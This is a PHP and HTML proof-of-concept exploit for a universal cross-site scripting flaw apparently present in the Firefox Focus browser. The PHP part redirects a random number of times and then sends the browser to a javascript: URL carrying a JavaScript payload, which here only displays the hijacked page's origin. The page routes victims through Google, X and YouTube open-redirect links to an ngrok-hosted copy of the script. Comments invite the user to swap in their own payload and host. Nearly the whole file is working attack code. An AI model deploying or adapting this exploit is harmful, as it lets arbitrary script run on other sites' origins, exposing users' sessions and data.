<?php
// JS payload — يعدل على حسب ما بدك
$js_code = <<<'JSCODE'
(function(){if(!document.querySelector('meta[name="viewport"]')){var m=document.createElement('meta');m.name='viewport';m.content='width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no';document.head.appendChild(m);}document.body.innerHTML=`<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#1a1b1e;color:#fff;padding:32px 24px;font-family:sans-serif;box-sizing:border-box;word-break:break-all;overflow-y:auto"><h1 style="font-size:28px;margin:0 0 24px;color:#ff4444;line-height:1.2">Firefox Focus UXSS POC</h1><div style="margin-bottom:20px"><div style="font-size:14px;color:#aaa;text-transform:uppercase;margin-bottom:4px">Origin</div><div style="font-size:18px">${location.origin}</div></div><div style="margin-bottom:20px"><div style="font-size:14px;color:#aaa;text-transform:uppercase;margin-bottom:4px">URL</div><div style="font-size:18px">${location.href}</div></div><div><div style="font-size:14px;color:#aaa;text-transform:uppercase;margin-bottom:4px">Domain</div><div style="font-size:18px">${document.domain||'none'}</div></div></div>`;})();
JSCODE;

if (isset($_GET['redirect'])) {
    $count = isset($_GET['count']) ? (int)$_GET['count'] : 0;
    $final = "javascript:" . $js_code;

    if ($count < rand(9, 15)) {
        $count++;
        header("Location: ?redirect=1&count=" . $count);
        exit();
    } else {
        sleep(1);
        header("Location: " . $final);
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
  <title>Firefox Focus UXSS POC</title>
  <style>
    *, *::before, *::after {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }
    :root {
      --bg: #1a1b1e;
      --surface: #212226;
      --surface-hover: #272930;
      --border: #2e3035;
      --text-primary: #e8eaed;
      --text-muted: #5a6270;
      --text-label: #8b95a1;
      --accent: #a8c7fa;
    }
    html, body {
      height: 100%;
      background: var(--bg);
      color: var(--text-primary);
      font-family: 'Syne', sans-serif;
      overflow: hidden;
    }
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100dvh;
      padding: 24px 20px;
    }
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background:
        radial-gradient(ellipse 60% 40% at 50% 0%, rgba(168,199,250,0.04) 0%, transparent 70%),
        radial-gradient(ellipse 40% 30% at 80% 100%, rgba(168,199,250,0.03) 0%, transparent 60%);
      pointer-events: none;
      z-index: 0;
    }
    .wrapper {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 390px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 40px;
    }
    .header { text-align: center; }
    .header-eyebrow {
      font-family: monospace;
      font-size: 10px;
      letter-spacing: .18em;
      text-transform: uppercase;
      color: var(--text-muted);
      margin-bottom: 10px;
    }
    .header-title {
      font-size: 26px;
      font-weight: 700;
      color: var(--text-primary);
      letter-spacing: -.02em;
    }
    .header-title span { color: var(--accent); }
    .grid { width: 100%; display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .btn {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 22px 16px 18px;
      cursor: pointer;
      transition: background .15s ease, border-color .15s ease, transform .12s ease;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 10px;
      user-select: none;
      -webkit-user-select: none;
    }
    .btn:active {
      transform: scale(0.96);
      background: var(--surface-hover);
      border-color: rgba(168,199,250,0.2);
    }
    .btn-label { font-size: 13px; font-weight: 500; color: var(--text-label); }
    .divider { width: 40px; height: 1px; background: var(--border); }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="header">
      <div class="header-eyebrow">V12</div>
      <div class="header-title">Firefox Focus <span>UXSS</span> POC</div>
    </div>
    <div class="grid">
      <button class="btn" onclick="go('google')">
        <div class="btn-label">Google</div>
      </button>
      <button class="btn" onclick="go('x')">
        <div class="btn-label">X</div>
      </button>
      <button class="btn" onclick="go('youtube')">
        <div class="btn-label">YouTube</div>
      </button>
      <button class="btn" onclick="go('reddit')">
        <div class="btn-label">Reddit</div>
      </button>
    </div>
    <div class="divider"></div>
  </div>

  <script>
    // ⚠️ غير الرابط到下 مع رابط ngrok تبعك
    const BASE = 'https://abc123.ngrok.io/poc.php';

    const urls = {
      google:  'https://www.google.com/url?q=' + encodeURIComponent(BASE + '?redirect=1') + '&sa=D&sntz=1&usg=AOvVaw1uB0j5rrgN2xkfoBgA9G0T',
      x:       'https://x.com/safety/unsafe_link_warning?unsafe_link=' + encodeURIComponent(BASE + '?redirect=1'),
      youtube: 'https://www.youtube.com/redirect?q=' + encodeURIComponent(BASE + '?redirect=1'),
      reddit:  'https://old.reddit.com/user/Key_Link_3930/comments/1lw6q5z/hello_world/'
    };

    function go(name) {
      const url = urls[name];
      if (url) window.open(url, '_self');
    }
  </script>
</body>
</html>
